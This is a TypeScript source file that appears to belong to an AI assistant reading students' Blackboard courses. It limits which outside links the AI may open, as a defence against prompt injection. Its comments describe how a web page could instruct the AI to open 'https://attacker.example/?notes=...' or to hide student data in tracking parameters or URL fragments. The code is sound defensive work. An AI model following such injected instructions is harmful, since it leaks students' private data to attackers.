/**
 * Which outside links the AI may open.
 *
 * Only links that appeared in the student's own Blackboard data (a link item,
 * a document body, an announcement), plus the files inside a shared Drive
 * folder and pages on the same site as one of those links. The reason is
 * prompt injection: a web page can contain text addressed to the AI, and
 * without this rule "now open https://attacker.example/?notes=..." would work.
 * With it, the AI can only reach places a professor already pointed to.
 *
 * In memory only. After a restart, the link tool re-reads the course to
 * rebuild the list.
 */

const MAX_ENTRIES = 20_000;
/** Match key → the exact URL as it appeared in Blackboard. */
const allowed = new Map<string, string>();

/** Compare URLs without the parts that do not change what is fetched. */
export function linkKey(raw: string): string | null {
  try {
    const u = new URL(raw);
    // A username/password in a link is never something a professor posts,
    // and would be a place to smuggle data.
    if (u.username || u.password) return null;
    u.hash = '';
    // Share-tracking parameters differ between copies of the same link.
    for (const p of ['usp', 'si', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term']) {
      u.searchParams.delete(p);
    }
    const path = u.pathname.replace(/\/+$/, '') || '/';
    return `${u.protocol}//${u.host.toLowerCase()}${path}${u.search}`;
  } catch {
    return null;
  }
}

function remember(key: string, url: string): void {
  if (allowed.has(key)) return;
  if (allowed.size >= MAX_ENTRIES) {
    const oldest = allowed.keys().next().value;
    if (oldest !== undefined) allowed.delete(oldest);
  }
  allowed.set(key, url);
}

/** Record links that came straight from Blackboard data. */
export function allowLinks(urls: Iterable<string>): void {
  for (const url of urls) {
    const key = linkKey(url);
    if (key) remember(key, url);
  }
}

/**
 * Record links found on a page that was itself allowed. Only links literally
 * on that page, and only on the same site (a course website's own lecture
 * PDFs, a Drive folder's files). A URL the AI makes up — say, one carrying
 * the student's data to somewhere else — is never on the page, so it is
 * never allowed.
 */
export function allowSameSiteLinks(fromUrl: string, urls: Iterable<string>): string[] {
  let site: string;
  try {
    site = siteOf(new URL(fromUrl).hostname);
  } catch {
    return [];
  }
  const kept: string[] = [];
  for (const url of urls) {
    try {
      if (siteOf(new URL(url).hostname) !== site) continue;
    } catch {
      continue;
    }
    const key = linkKey(url);
    if (key) {
      remember(key, url);
      kept.push(url);
    }
  }
  return kept;
}

/**
 * The registrable part of a hostname, roughly: "docs.google.com" and
 * "drive.google.com" are one site, "evil.github.io" and "good.github.io" are
 * not (shared hosting suffixes keep their subdomain).
 */
function siteOf(hostname: string): string {
  const parts = hostname.toLowerCase().split('.');
  const shared = ['github.io', 'substack.com', 'blogspot.com', 'wordpress.com', 'netlify.app', 'vercel.app', 'pages.dev', 'sites.google.com'];
  for (const suffix of shared) {
    if (hostname.endsWith(`.${suffix}`)) return parts.slice(-(suffix.split('.').length + 1)).join('.');
  }
  const twoLevel = /\.(ac|co|edu|gov|org|com)\.[a-z]{2}$/.test(hostname);
  return parts.slice(twoLevel ? -3 : -2).join('.');
}

export function isLinkAllowed(url: string): boolean {
  return allowedUrl(url) !== null;
}

/**
 * The URL to actually open: the one Blackboard showed, never the caller's
 * spelling of it. The match ignores tracking tags and #fragments so the AI
 * can find the link, but opening the caller's version would let a page's
 * hidden instructions tuck the student's data into a "?utm_source=" or a
 * "#..." on an allowed address.
 */
export function allowedUrl(url: string): string | null {
  const key = linkKey(url);
  return key === null ? null : (allowed.get(key) ?? null);
}

/** Test hook. */
export function clearAllowedLinks(): void {
  allowed.clear();
}
